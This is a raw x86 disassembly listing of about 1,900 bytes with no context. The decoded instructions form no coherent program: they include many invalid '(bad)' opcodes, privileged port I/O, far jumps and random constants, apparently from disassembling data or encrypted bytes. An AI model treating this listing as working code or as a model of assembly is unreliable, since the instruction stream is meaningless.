  4c117a:	mov    esi,0x3eb422c4
  4c117f:	int3   
  4c1180:	dec    DWORD PTR [esi+0x210c2bf0]
  4c1186:	enter  0xf590,0x9c
  4c118a:	add    BYTE PTR [ebp+eiz*2-0x2f0cc0fb],bl
  4c1191:	inc    eax
  4c1192:	pop    ebx
  4c1193:	cdq    
  4c1194:	dec    edx
  4c1195:	add    al,0x4d
  4c1197:	push   ss
  4c1198:	fadd   st,st(2)
  4c119a:	inc    edx
  4c119b:	mov    bh,0xc1
  4c119d:	pop    esi
  4c119e:	add    BYTE PTR [ebx+edx*1],ch
  4c11a1:	xchg   DWORD PTR [eax+esi*1],edi
  4c11a4:	rol    esi,1
  4c11a6:	retf   0x42ef
  4c11a9:	and    eax,0xc84d0bbe
  4c11ae:	imul   esp,edx,0x7
  4c11b1:	xchg   esi,eax
  4c11b2:	sbb    ecx,DWORD PTR [edx+eiz*1]
  4c11b5:	loope  0x4c1141
  4c11b7:	mov    DWORD PTR [ebp+0x19],esi
  4c11ba:	fcmovb st,st(0)
  4c11bc:	nop
  4c11bd:	sar    bh,0xfc
  4c11c0:	cld    
  4c11c1:	(bad)  
  4c11c2:	dec    esp
  4c11c3:	retf   
  4c11c4:	test   eax,0x3983609b
  4c11c9:	adc    BYTE PTR [ebp+0x5b],dh
  4c11cc:	inc    eax
  4c11cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4c11ce:	imul   eax,DWORD PTR [eax+eiz*1],0x60825368
  4c11d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4c11d6:	push   edx
  4c11d7:	js     0x4c11c2
  4c11d9:	dec    ecx
  4c11da:	je     0x4c11ef
  4c11dc:	push   cs
  4c11dd:	not    BYTE PTR [esi]
  4c11df:	mov    DWORD PTR [ebx+ebx*2+0x69909f14],edx
  4c11e6:	xor    cl,BYTE PTR ds:0x9d7a84dc
  4c11ec:	loope  0x4c120e
  4c11ee:	test   DWORD PTR [eax-0x27ffdcfb],ecx
  4c11f4:	xchg   esi,eax
  4c11f5:	loope  0x4c1249
  4c11f7:	add    al,0x9
  4c11f9:	dec    ecx
  4c11fa:	test   BYTE PTR [edx-0x12],0x5d
  4c11fe:	sbb    ecx,DWORD PTR [ebp-0x28]
  4c1201:	fxch   st(3)
  4c1203:	xor    ebx,DWORD PTR [edi+ebp*2-0x25]
  4c1207:	pop    eax
  4c1208:	sbb    esi,esi
  4c120a:	push   ebx
  4c120b:	dec    ecx
  4c120c:	fwait
  4c120d:	xchg   ebx,eax
  4c120e:	pop    edx
  4c120f:	push   ecx
  4c1210:	fs enter 0xa303,0xc3
  4c1215:	rol    BYTE PTR [eax-0x66],0x63
  4c1219:	inc    ecx
  4c121a:	xor    dl,dh
  4c121c:	lock ret 0xca86
  4c1220:	and    dl,BYTE PTR [edi+0x40]
  4c1223:	or     al,0xce
  4c1225:	jmp    0xe121:0x100e1982
  4c122c:	mov    bl,0x7
  4c122e:	loopne 0x4c1240
  4c1230:	fstp   DWORD PTR [esp+edx*1-0x7f]
  4c1234:	mov    dl,0x8b
  4c1236:	mov    DWORD PTR [eax-0x1fce437f],0x1b626525
  4c1240:	ret    0x7b14
  4c1243:	call   0x85ac0d8e
  4c1248:	out    0xe8,al
  4c124a:	or     esi,DWORD PTR [eax+eiz*2+0x48]
  4c124e:	je     0x4c129e
  4c1250:	dec    eax
  4c1251:	jne    0x4c12b9
  4c1253:	je     0x4c122d
  4c1255:	ins    BYTE PTR es:[edi],dx
  4c1256:	enter  0xd2fe,0x93
  4c125a:	stos   DWORD PTR es:[edi],eax
  4c125b:	jl     0x4c1248
  4c125d:	pop    ecx
  4c125e:	adc    edi,DWORD PTR [ebp+0x4b]
  4c1261:	mov    al,ds:0xe855016d
  4c1266:	(bad)  
  4c1267:	pop    edx
  4c1268:	or     eax,0x20ad8095
  4c126d:	out    dx,eax
  4c126e:	loope  0x4c1240
  4c1270:	push   ss
  4c1271:	or     al,0x6
  4c1273:	icebp  
  4c1274:	popf   
  4c1275:	and    DWORD PTR ds:0x64e3249d,esi
  4c127b:	pop    es
  4c127c:	add    al,0x80
  4c127e:	pushf  
  4c127f:	inc    edi
  4c1280:	adc    edi,DWORD PTR [edi]
  4c1282:	cmp    bl,cl
  4c1284:	(bad)  
  4c1285:	jmp    0x4c1293
  4c1287:	std    
  4c1288:	stc    
  4c1289:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4c128a:	or     al,0xdc
  4c128c:	xor    eax,0xda990568
  4c1291:	imul   ecx,DWORD PTR ds:0x43317540,0xbd3835e2
  4c129b:	or     eax,0x72bf984
  4c12a0:	fcomp  st(2)
  4c12a2:	and    DWORD PTR ds:0xa0abd2d5,esi
  4c12a8:	dec    edi
  4c12a9:	popf   
  4c12aa:	jmp    0x4c12df
  4c12ac:	mov    edx,0x2ceb566e
  4c12b1:	nop
  4c12b2:	fld    TBYTE PTR es:[edx]
  4c12b5:	mov    BYTE PTR [ebx+0x2],0x90
  4c12b9:	or     BYTE PTR [ebp-0x6b],bl
  4c12bc:	jo     0x4c133d
  4c12be:	push   eax
  4c12bf:	movzx  ecx,BYTE PTR es:[edi+eax*4]
  4c12c4:	imul   edi,DWORD PTR [ebp+0x15a3636a],0xc8934899
  4c12ce:	jns    0x4c12b8
  4c12d0:	cmp    eax,0x79156148
  4c12d5:	fist   WORD PTR [eax]
  4c12d7:	cmp    al,0x71
  4c12d9:	sub    ch,BYTE PTR [edi]
  4c12db:	add    BYTE PTR [eax],0xdb
  4c12de:	mov    ?,WORD PTR [ebx+ebp*1-0x7b61c2b8]
  4c12e5:	scas   al,BYTE PTR es:[edi]
  4c12e6:	mov    BYTE PTR [ebp-0x6],bl
  4c12e9:	add    al,0xfb
  4c12eb:	call   0x2e6dc3e7
  4c12f0:	jnp    0x4c12bd
  4c12f2:	mov    WORD PTR [ecx],gs
  4c12f4:	mov    bh,0xe
  4c12f6:	dec    eax
  4c12f7:	sub    eax,0xd47da68e
  4c12fc:	xor    ecx,DWORD PTR [ebp+esi*2-0x33ef3b53]
  4c1303:	sub    BYTE PTR [ebp-0x532f570d],0x75
  4c130a:	(bad)  
  4c130c:	ss sub al,0x9
  4c130f:	push   esi
  4c1310:	test   BYTE PTR ds:0x49b33775,al
  4c1316:	(bad)  
  4c1317:	and    al,0xe5
  4c1319:	outs   dx,BYTE PTR ds:[esi]
  4c131a:	push   edi
  4c131b:	mov    esp,eax
  4c131d:	adc    dl,cl
  4c131f:	sbb    BYTE PTR [ecx+0xd84d499],bl
  4c1325:	ror    BYTE PTR [edi+0xb0c3092],0x2b
  4c132c:	(bad)  
  4c132d:	bound  ebp,QWORD PTR [eax-0x77b37ddd]
  4c1333:	lock lea esp,[edx-0x4173fb1e]
  4c133a:	iret   
  4c133b:	in     eax,dx
  4c133c:	xor    dh,BYTE PTR [eax+0x4a]
  4c133f:	cmp    DWORD PTR [ecx],ecx
  4c1341:	pushf  
  4c1342:	dec    esp
  4c1343:	pop    es
  4c1344:	sub    BYTE PTR [edx+ecx*2+0x4028907f],ch
  4c134b:	js     0x4c12f0
  4c134d:	xor    BYTE PTR [esi],dh
  4c134f:	dec    ecx
  4c1350:	lods   al,BYTE PTR ds:[esi]
  4c1351:	popa   
  4c1352:	sub    ch,dh
  4c1354:	jnp    0x4c12f2
  4c1356:	mov    bh,0x66
  4c1358:	nop
  4c1359:	mov    ?,WORD PTR [edx]
  4c135b:	xor    eax,0xed9ac8d2
  4c1360:	xor    cl,ah
  4c1362:	jbe    0x4c135a
  4c1364:	inc    esi
  4c1365:	mov    esp,0x33668c39
  4c136a:	or     edi,DWORD PTR [esi-0x66]
  4c136d:	data16 sbb cl,BYTE PTR [ebp-0x52]
  4c1371:	jne    0x4c131c
  4c1373:	cmp    dh,ch
  4c1375:	jne    0x4c131b
  4c1377:	sti    
  4c1378:	daa    
  4c1379:	xchg   ebp,eax
  4c137a:	push   ecx
  4c137b:	aaa    
  4c137c:	aas    
  4c137d:	mov    BYTE PTR [ebp-0x6],0x89
  4c1381:	or     cl,BYTE PTR [edi+0x5]
  4c1384:	cmp    al,0x32
  4c1386:	cmp    DWORD PTR [eax],0x2
  4c1389:	add    dl,BYTE PTR ss:[esi+ebp*1]
  4c138d:	inc    edx
  4c138e:	add    eax,0x12f4ab4b
  4c1393:	or     eax,DWORD PTR [esi]
  4c1395:	xor    ch,BYTE PTR [edx*1+0x44080701]
  4c139c:	mov    BYTE PTR [esi+0x16],dl
  4c139f:	inc    esi
  4c13a0:	int3   
  4c13a1:	and    ecx,DWORD PTR [ecx]
  4c13a3:	ins    DWORD PTR es:[edi],dx
  4c13a4:	lahf   
  4c13a5:	(bad)  
  4c13a6:	xlat   BYTE PTR ds:[ebx]
  4c13a7:	call   FWORD PTR [edx+0x57bd750b]
  4c13ad:	add    dl,al
  4c13af:	sub    BYTE PTR [edi+0x619121c4],al
  4c13b5:	jno    0x4c13bc
  4c13b7:	cdq    
  4c13b8:	in     eax,0xf1
  4c13ba:	push   cs
  4c13bb:	cwde   
  4c13bc:	aaa    
  4c13bd:	fild   WORD PTR [edx-0x346efba8]
  4c13c3:	pop    edi
  4c13c4:	pcmpeqw mm3,QWORD PTR [edx-0x1]
  4c13c8:	sub    DWORD PTR [ebp+0x1e],0xf4b41241
  4c13cf:	push   ecx
  4c13d0:	popa   
  4c13d1:	frstor [esi-0x33fd44cb]
  4c13d7:	xchg   ecx,eax
  4c13d8:	aam    0x43
  4c13da:	mov    edx,0x3876522b
  4c13df:	dec    esi
  4c13e0:	in     eax,0x27
  4c13e2:	jno    0x4c13ec
  4c13e4:	push   ss
  4c13e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4c13e6:	ss jae 0x4c1406
  4c13e9:	cmp    dh,al
  4c13eb:	test   eax,0x62510ee
  4c13f0:	scas   al,BYTE PTR es:[edi]
  4c13f1:	test   eax,0xd73061d4
  4c13f6:	mov    BYTE PTR [eax],al
  4c13f8:	dec    ebp
  4c13f9:	fdiv   st(1),st
  4c13fb:	(bad)  
  4c13fc:	or     al,0xe0
  4c13fe:	xor    BYTE PTR [edx-0x7cbff675],al
  4c1404:	cmp    DWORD PTR [ecx-0x4],eax
  4c1407:	shl    esp,cl
  4c1409:	cli    
  4c140a:	xchg   DWORD PTR [ebp-0x7e7c62bf],edx
  4c1410:	and    eax,0x1dec46f6
  4c1415:	aas    
  4c1416:	add    ebp,DWORD PTR [eax+0x77]
  4c1419:	jmp    0x4c1492
  4c141b:	mov    esi,DWORD PTR [edx]
  4c141d:	dec    esi
  4c141e:	push   edx
  4c141f:	mov    WORD PTR [esi+0x37],ss
  4c1422:	or     eax,0x9fe63899
  4c1427:	mov    DWORD PTR [edx+0x1e],edx
  4c142a:	shl    BYTE PTR ds:0x802f484,0x58
  4c1431:	dec    ebp
  4c1432:	adc    dl,ah
  4c1434:	adc    BYTE PTR [eax-0x14fefb71],al
  4c143a:	or     eax,0x8be48fdb
  4c143f:	mov    cs,WORD PTR ds:0x89508445
  4c1445:	xor    ah,BYTE PTR [ecx]
  4c1447:	pop    esp
  4c1448:	cmp    al,0xda
  4c144a:	jmp    0x4c141b
  4c144c:	mov    BYTE PTR [eax+0x2f90a312],cl
  4c1452:	call   0x5284:0x558dcda7
  4c1459:	repz pop esp
  4c145b:	adc    bl,BYTE PTR [esi-0x650b7270]
  4c1461:	push   es
  4c1462:	fwait
  4c1463:	mov    ah,0xa6
  4c1465:	je     0x4c1421
  4c1467:	pop    ss
  4c1468:	xchg   edx,eax
  4c1469:	jne    0x4c14af
  4c146b:	cmp    ebx,DWORD PTR [ecx-0x3fba71fc]
  4c1471:	add    al,BYTE PTR [esi]
  4c1473:	sub    BYTE PTR [ebx],al
  4c1475:	ds dec edi
  4c1477:	(bad)  
  4c1478:	dec    DWORD PTR [edi]
  4c147a:	add    BYTE PTR [ecx-0x37],dl
  4c147d:	clc    
  4c147e:	mov    cl,0x9d
  4c1480:	repz pop ds
  4c1482:	dec    ebx
  4c1483:	sbb    al,0xc0
  4c1485:	add    al,0xa1
  4c1487:	(bad)  
  4c1488:	mov    DWORD PTR [ebx+0x24694309],0x21c2f107
  4c1492:	icebp  
  4c1493:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4c1494:	jne    0xebac6290
  4c149a:	ds sbb esp,edi
  4c149d:	jmp    0x8308:0xc68b7612
  4c14a4:	mov    cl,0xd4
  4c14a6:	leave  
  4c14a7:	mov    ah,0x8e
  4c14a9:	adc    ebp,DWORD PTR [ebp-0x3d]
  4c14ac:	add    al,0x6e
  4c14ae:	ds inc edi
  4c14b0:	adc    eax,0x42f84ab9
  4c14b5:	jmp    0x4c1460
  4c14b7:	mov    edi,0x2244be0d
  4c14bc:	push   edx
  4c14bd:	dec    eax
  4c14be:	add    BYTE PTR [ebp+eax*2+0x4a9febc8],ch
  4c14c5:	jmp    0x4c14fb
  4c14c7:	(bad)  
  4c14c8:	out    dx,al
  4c14c9:	mov    edi,0x38982496
  4c14ce:	push   ebp
  4c14cf:	(bad)  
  4c14d0:	jne    0x4c1465
  4c14d2:	test   BYTE PTR [ecx],bl
  4c14d4:	inc    esi
  4c14d5:	inc    eax
  4c14d6:	sub    DWORD PTR [edx],0xffffffcd
  4c14d9:	repz std 
  4c14db:	push   eax
  4c14dc:	adc    ecx,DWORD PTR [esi]
  4c14de:	fst    st(6)
  4c14e0:	xchg   esp,eax
  4c14e1:	jle    0x4c147d
  4c14e3:	push   0xf
  4c14e5:	clc    
  4c14e6:	jmp    0x4c1508
  4c14e8:	push   ebp
  4c14e9:	sub    BYTE PTR [ebp+0x5e0fa5bf],0xf8
  4c14f0:	mov    edx,esi
  4c14f2:	mov    DWORD PTR [ecx-0x45aa9e60],0xd682c515
  4c14fc:	push   edi
  4c14fd:	mov    al,ds:0x757fcd4e
  4c1502:	sbb    cl,dh
  4c1504:	mov    ah,0x67
  4c1506:	lds    esi,FWORD PTR [esp+edi*4+0x32]
  4c150a:	inc    DWORD PTR [edi]
  4c150c:	cmp    dh,0xf0
  4c150f:	lods   eax,DWORD PTR ds:[esi]
  4c1510:	outs   dx,DWORD PTR ds:[esi]
  4c1511:	sar    DWORD PTR [edx-0x12],cl
  4c1514:	out    0xc6,al
  4c1516:	push   ebx
  4c1517:	add    BYTE PTR [esi-0x58],0x82
  4c151b:	pop    ds
  4c151c:	sub    edx,ebp
  4c151e:	or     DWORD PTR [ecx+0x74db0821],0x4b
  4c1525:	cwde   
  4c1526:	and    bl,al
  4c1528:	push   0x65
  4c152a:	inc    ebp
  4c152b:	cmp    eax,0x321007c0
  4c1530:	in     al,dx
  4c1531:	pop    es
  4c1532:	call   0xf0b8:0x3b06d742
  4c1539:	outs   dx,DWORD PTR ds:[esi]
  4c153a:	push   eax
  4c153b:	jae    0x4c14eb
  4c153d:	enter  0x472d,0x9
  4c1541:	pop    edx
  4c1542:	enter  0x4617,0xc6
  4c1546:	jae    0x4c15b0
  4c1548:	pop    ss
  4c1549:	(bad)  
  4c154a:	xor    al,0x98
  4c154c:	ja     0x4c153f
  4c154e:	or     eax,0x4d808b9f
  4c1553:	or     BYTE PTR [eax],bl
  4c1555:	imul   DWORD PTR [edx+0x2e]
  4c1558:	sar    BYTE PTR [edx],0xdd
  4c155b:	jns    0x4c1563
  4c155d:	sbb    edx,DWORD PTR [edi]
  4c155f:	sub    edx,DWORD PTR [eax+edi*2]
  4c1562:	push   es
  4c1563:	push   ss
  4c1564:	out    dx,eax
  4c1565:	std    
  4c1566:	pop    DWORD PTR [edx]
  4c1568:	ds retf 0xf8d0
  4c156c:	pop    esp
  4c156d:	mov    edi,0xd35047f
  4c1572:	push   esi
  4c1573:	lea    ebp,[edx+edi*2+0x5]
  4c1577:	(bad)  
  4c1578:	pop    ebx
  4c1579:	mov    ebp,0xb76332ae
  4c157e:	in     al,dx
  4c157f:	sub    al,0x8e
  4c1581:	add    dl,BYTE PTR [esi]
  4c1583:	ret    0x6b6b
  4c1586:	push   ebp
  4c1587:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4c1588:	cmc    
  4c1589:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4c158a:	lock leave 
  4c158c:	jne    0x4c15ad
  4c158e:	inc    ecx
  4c158f:	shl    DWORD PTR [eax+0x64ccadc2],1
  4c1595:	je     0x4c15b8
  4c1597:	sbb    DWORD PTR ds:0x11adcac0,edx
  4c159d:	pop    ebp
  4c159e:	mov    al,0x8
  4c15a0:	jbe    0x4c154a
  4c15a2:	div    DWORD PTR [eax]
  4c15a4:	in     eax,dx
  4c15a5:	sbb    DWORD PTR [ecx],eax
  4c15a7:	popa   
  4c15a8:	mov    eax,ds:0xe70c5d34
  4c15ad:	pop    es
  4c15ae:	lea    ecx,[edi]
  4c15b0:	sbb    al,BYTE PTR [edi-0x77513885]
  4c15b6:	dec    esp
  4c15b7:	imul   eax,DWORD PTR [esi+0x17187401],0x75cacc02
  4c15c1:	enter  0xc74,0x3
  4c15c5:	fidivr DWORD PTR [ebx+0x39]
  4c15c8:	mov    esp,0x3b3f63e6
  4c15cd:	pop    eax
  4c15ce:	add    al,0x7e
  4c15d0:	dec    ebp
  4c15d1:	pop    ss
  4c15d2:	or     BYTE PTR [ebp+0x41],bh
  4c15d5:	inc    esi
  4c15d6:	sbb    DWORD PTR [ecx+0x6034ea0],esp
  4c15dc:	push   ecx
  4c15dd:	or     cl,ah
  4c15df:	sbb    edi,DWORD PTR [esi]
  4c15e1:	pop    es
  4c15e2:	bound  esi,QWORD PTR [esp+edi*1-0x2d]
  4c15e6:	adc    bh,BYTE PTR [esi+edx*4-0x57]
  4c15ea:	popa   
  4c15eb:	sub    BYTE PTR [ebp-0x1e69f36d],0x84
  4c15f2:	cmp    al,0x95
  4c15f4:	imul   esi,DWORD PTR [ecx],0xc518f4d
  4c15fa:	sub    DWORD PTR [esi],eax
  4c15fc:	sbb    BYTE PTR [ecx-0x79e5876b],0x1c
  4c1603:	or     BYTE PTR [ecx-0x7f36cc9f],dl
  4c1609:	xchg   ebp,eax
  4c160a:	or     BYTE PTR [ebp+edx*4-0xc],dh
  4c160e:	jmp    0xec4a:0x8e06f343
  4c1615:	sbb    eax,0xb693cb6e
  4c161a:	push   es
  4c161b:	mov    ecx,0x1e081c0c
  4c1620:	xchg   BYTE PTR [esi-0x13c2bf77],al
  4c1626:	(bad)  
  4c1627:	in     al,dx
  4c1628:	dec    edx
  4c1629:	inc    ecx
  4c162a:	dec    ebx
  4c162b:	dec    esi
  4c162c:	in     al,dx
  4c162d:	and    BYTE PTR [ecx+0x4d],0xc0
  4c1631:	loope  0x4c169d
  4c1633:	lea    edi,[ebx-0x478a7581]
  4c1639:	dec    edx
  4c163a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4c163b:	mov    DWORD PTR [eax+0x11],ecx
  4c163e:	dec    esi
  4c163f:	je     0x4c1689
  4c1641:	pop    ebp
  4c1642:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4c1643:	and    DWORD PTR [edi-0x49],eax
  4c1646:	lods   al,BYTE PTR ds:[esi]
  4c1647:	xchg   BYTE PTR [ebx],bl
  4c1649:	xchg   BYTE PTR [ecx+0x53],al
  4c164c:	jno    0xf8b9d755
  4c1652:	aad    0x56
  4c1654:	and    BYTE PTR ds:0xecb289a0,al
  4c165a:	and    DWORD PTR [edx],0x7512105e
  4c1660:	mov    eax,0xdbd12d1a
  4c1665:	pop    ebx
  4c1666:	fmul   DWORD PTR [ecx]
  4c1668:	cld    
  4c1669:	push   ebx
  4c166a:	pop    ebp
  4c166b:	push   0x6c5d0f09
  4c1670:	enter  0x4250,0xb4
  4c1674:	les    edi,FWORD PTR [esi]
  4c1676:	and    al,0x74
  4c1678:	inc    edx
  4c1679:	or     eax,0x745c0264
  4c167e:	pop    ecx
  4c167f:	add    BYTE PTR [edi*1-0x3ef0667a],bh
  4c1686:	mov    edx,0xfbee1500
  4c168b:	dec    eax
  4c168c:	je     0x4c16b9
  4c168e:	dec    esp
  4c168f:	dec    ebp
  4c1690:	pop    esp
  4c1691:	xor    BYTE PTR [ebp+edi*4+0x266d480c],0x67
  4c1699:	pop    ds
  4c169a:	adc    al,dl
  4c169c:	xor    BYTE PTR [ecx],al
  4c169e:	add    BYTE PTR [eax],dl
  4c16a0:	inc    ebx
  4c16a1:	dec    esp
  4c16a2:	add    BYTE PTR [esi+0x4bc5e02],0x45
  4c16a9:	ds jne 0x4c16c9
  4c16ac:	push   cs
  4c16ad:	cli    
  4c16ae:	add    al,ah
  4c16b0:	mov    dh,0x1c
  4c16b2:	das    
  4c16b3:	inc    esi
  4c16b4:	add    eax,0xc5d4bafc
  4c16b9:	jecxz  0x4c16b7
  4c16bb:	scas   eax,DWORD PTR es:[edi]
  4c16bc:	add    cl,BYTE PTR [eax+0x41a50269]
  4c16c2:	iret   
  4c16c3:	push   ebx
  4c16c4:	hlt    
  4c16c5:	js     0x4c1652
  4c16c7:	pop    edx
  4c16c8:	lock fmul st,st(0)
  4c16cb:	cld    
  4c16cc:	bound  esi,QWORD PTR [edi+0x40]
  4c16cf:	or     al,bh
  4c16d1:	and    DWORD PTR [edx-0x27a27773],0x6163c724
  4c16db:	jmp    0x4c1752
  4c16dd:	bound  ebp,QWORD PTR [eax-0x4942149b]
  4c16e3:	into   
  4c16e4:	inc    edx
  4c16e5:	cwde   
  4c16e6:	and    eax,DWORD PTR [edx]
  4c16e8:	adc    bh,BYTE PTR [ebx-0x4eeebe50]
  4c16ee:	and    al,0x5c
  4c16f0:	bound  esp,QWORD PTR [edx]
  4c16f2:	add    ecx,DWORD PTR [edi]
  4c16f4:	rol    DWORD PTR [esi+0x25],1
  4c16f7:	bound  edx,QWORD PTR [ebx-0x6b31362b]
  4c16fd:	inc    edi
  4c16fe:	pop    es
  4c16ff:	xchg   esi,eax
  4c1700:	iret   
  4c1701:	jns    0x4c16a3
  4c1703:	xor    bh,ch
  4c1705:	push   edi
  4c1706:	add    edi,DWORD PTR [edx]
  4c1708:	psubusb mm5,mm2
  4c170b:	(bad)  
  4c170c:	cs xor eax,0x4e941f81
  4c1712:	or     BYTE PTR [eax+0x6939b7d0],dh
  4c1718:	pop    ebx
  4c1719:	or     BYTE PTR [ebp-0x1747f157],ah
  4c171f:	dec    eax
  4c1720:	lock aam 0x60
  4c1723:	ins    BYTE PTR es:[edi],dx
  4c1724:	and    eax,0x83c23e3a
  4c1729:	iret   
  4c172a:	inc    DWORD PTR [edi]
  4c172c:	lods   al,BYTE PTR ds:[esi]
  4c172d:	mov    eax,0x52f35750
  4c1732:	add    al,0xac
  4c1734:	loope  0x4c16f3
  4c1736:	ror    esp,1
  4c1738:	js     0xeb4fcb8d
  4c173e:	lahf   
  4c173f:	nop
  4c1740:	mov    eax,0xf0cdfe3
  4c1745:	lahf   
  4c1746:	call   DWORD PTR [esi+0x20]
  4c1749:	call   0x8c43075d
  4c174e:	clc    
  4c174f:	jmp    0x4c1771
  4c1751:	xor    BYTE PTR [eax-0x5],ch
  4c1754:	aad    0x6b
  4c1756:	adc    dl,BYTE PTR [esi]
  4c1758:	add    eax,0x44d17951
  4c175d:	nop
  4c175e:	dec    esi
  4c175f:	mov    cl,0x20
  4c1761:	test   BYTE PTR [ebx-0x238be5b6],dl
  4c1767:	ins    BYTE PTR es:[edi],dx
  4c1768:	xchg   edx,eax
  4c1769:	or     BYTE PTR [esi+eax*1+0x55],cl
  4c176d:	dec    ebp
  4c176e:	jge    0x4c1751
  4c1770:	push   0x2e
  4c1772:	jae    0xac9aacda
  4c1778:	and    al,0xf0
  4c177a:	fistp  WORD PTR [esi]
  4c177c:	jge    0x4c1796
  4c177e:	ss mov ah,0xcc
  4c1781:	and    dl,BYTE PTR [edx+0x28]
  4c1784:	(bad)
  4c1788:	call   0x2775:0x4e5588
  4c178f:	mov    esp,0x4f1b8003
  4c1794:	lock push edi
  4c1796:	out    0x3f,al
  4c1798:	push   esp
  4c1799:	ret    0x5962
  4c179c:	es and ebp,esp
  4c179f:	repnz lods al,BYTE PTR ds:[esi]
  4c17a1:	push   ebx
  4c17a2:	mov    edi,ebx
  4c17a4:	push   ebx
  4c17a5:	pop    ss
  4c17a6:	ins    DWORD PTR es:[edi],dx
  4c17a7:	jg     0x4c17ef
  4c17a9:	cwde   
  4c17aa:	push   ecx
  4c17ab:	add    DWORD PTR [edi-0x4a],0x678c8cde
  4c17b2:	hlt    
  4c17b3:	xchg   al,al
  4c17b5:	pop    ebp
  4c17b6:	mov    al,0xcb
  4c17b8:	in     al,0xea
  4c17ba:	jb     0x4c17c8
  4c17bc:	pop    ss
  4c17bd:	into   
  4c17be:	data16 mov al,ds:0xf753e0cb
  4c17c4:	add    eax,DWORD PTR [ecx+0x4dd9192d]
  4c17ca:	add    bh,BYTE PTR [esi+0x14]
  4c17cd:	nop
  4c17ce:	xlat   BYTE PTR ds:[ebx]
  4c17cf:	rcl    bl,0xb4
  4c17d2:	outs   dx,BYTE PTR ds:[esi]
  4c17d3:	xor    al,0x98
  4c17d5:	sub    dh,bl
  4c17d7:	es jo  0x4c1834
  4c17da:	inc    eax
  4c17db:	(bad)  
  4c17dc:	jl     0x4c17cb
  4c17de:	xor    BYTE PTR [edx+ecx*1],bh
  4c17e1:	outs   dx,DWORD PTR ds:[esi]
  4c17e2:	and    bh,bh
  4c17e4:	imul   ebx,DWORD PTR [ebp-0x4b797319],0xb7756f1a
  4c17ee:	push   ss
  4c17ef:	push   cs
  4c17f0:	jg     0x4c1781
  4c17f2:	jno    0x4c186d
  4c17f4:	stc    
  4c17f5:	push   edx
  4c17f6:	nop
  4c17f7:	inc    DWORD PTR [eax+edi*4-0x4]
  4c17fb:	add    esi,DWORD PTR [eax]
  4c17fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4c17fe:	mov    BYTE PTR [esi],al
  4c1800:	fld    QWORD PTR [edx+0x2d52ea]
  4c1806:	sbb    esp,DWORD PTR [ebp+0x53906287]
  4c180c:	mov    dh,0xd1
  4c180e:	ss loope 0x4c184e
  4c1811:	ins    DWORD PTR es:[edi],dx
  4c1812:	mov    al,ds:0x870a7d6e
  4c1817:	xlat   BYTE PTR ds:[ebx]
  4c1818:	and    eax,0x7e9b7f85
  4c181d:	jmp    0x4c1857
  4c181f:	rcr    DWORD PTR [eax+0x78cf089e],1
  4c1825:	jp     0x4c1879
  4c1827:	jmp    0x4c1859
  4c1829:	je     0x4c17ed
  4c182b:	mov    ch,0x4f
  4c182d:	jne    0x4c1845
  4c182f:	adc    al,dl
  4c1831:	aam    0x22
  4c1833:	inc    esi
  4c1834:	lahf   
  4c1835:	xor    BYTE PTR [esi],ah
  4c1837:	sub    WORD PTR [ecx+0x63626b73],si
  4c183e:	xchg   ecx,eax
  4c183f:	nop
  4c1840:	sub    BYTE PTR [ebx+0x2a06ead1],cl
  4c1846:	aas    
  4c1847:	daa    
  4c1848:	in     al,dx
  4c1849:	add    esi,esi
  4c184b:	cwde   
  4c184c:	mov    al,ds:0x9a5a364c
  4c1851:	pop    ss
  4c1852:	enter  0x4acb,0x36
  4c1856:	mov    al,ds:0xa838b84c
  4c185b:	add    esi,ecx
  4c185d:	sub    DWORD PTR [edx+0xd851763],edi
  4c1863:	int3   
  4c1864:	js     0x4c188e
  4c1866:	mov    eax,0x127ce855
  4c186b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4c186c:	test   DWORD PTR [edx-0x5e],ebp
  4c186f:	or     bl,BYTE PTR [eax+0x37ea6622]
  4c1875:	mov    DWORD PTR [edx],edi
  4c1877:	and    bl,BYTE PTR [esi]
  4c1879:	call   0xf22b:0x11741cee
  4c1880:	lods   al,BYTE PTR ds:[esi]
  4c1881:	fidiv  DWORD PTR [edx+0x57840b2]
  4c1887:	adc    al,0x2
  4c1889:	pop    eax
  4c188a:	adc    al,0x47
  4c188c:	outs   dx,BYTE PTR ds:[esi]
  4c188d:	push   es
  4c188e:	popf   
  4c188f:	push   cs
  4c1890:	lods   al,BYTE PTR ds:[esi]
  4c1891:	cmovl  esp,DWORD PTR [ecx]
  4c1894:	dec    esi
  4c1895:	inc    edx
  4c1896:	cli    
  4c1897:	xchg   edi,eax
  4c1898:	and    dh,ah
  4c189a:	pop    ds
  4c189b:	xchg   edx,eax
  4c189c:	jne    0x4c186e
  4c189e:	mov    BYTE PTR [ebp-0xd],0x1
  4c18a2:	jle    0x4c18ae
  4c18a4:	push   edi
  4c18a5:	push   cs
  4c18a6:	sub    eax,0x52984461
  4c18ab:	xchg   ebp,eax
  4c18ad:	xchg   esp,eax
  4c18ae:	xor    al,0x4d
  4c18b0:	cwde   
  4c18b1:	push   ecx
  4c18b2:	and    edx,DWORD PTR [esi]
  4c18b4:	xor    dh,BYTE PTR [eax+0x88a6aa2]
  4c18ba:	lea    ebp,[ebp+0x494f425f]
  4c18c0:	xchg   ebx,eax
  4c18c1:	ja     0x4c18af
  4c18c3:	inc    esi
  4c18c4:	or     eax,esp
  4c18c6:	in     al,0x9e
  4c18c8:	sub    bl,BYTE PTR [ebp+0x55b43229]
  4c18ce:	addr16 mov edi,0x20132e27
  4c18d4:	sbb    al,0x55
  4c18d6:	retf   0x1a0c
  4c18d9:	jmp    0xa25dea8e
  4c18de:	mov    eax,0x7b5fbcc8
  4c18e3:	or     edi,DWORD PTR [edi-0x47]
  4c18e6:	adc    BYTE PTR [ecx],cl
  4c18e8:	mov    eax,0x95a066cd
  4c18ed:	dec    ecx
  4c18ee:	adc    eax,0x7721713c
  4c18f3:	push   0x60
  4c18f5:	loopne 0x4c18da
  4c18f7:	enter  0x45b8,0xb
  4c18fb:	sbb    DWORD PTR [eax],esp
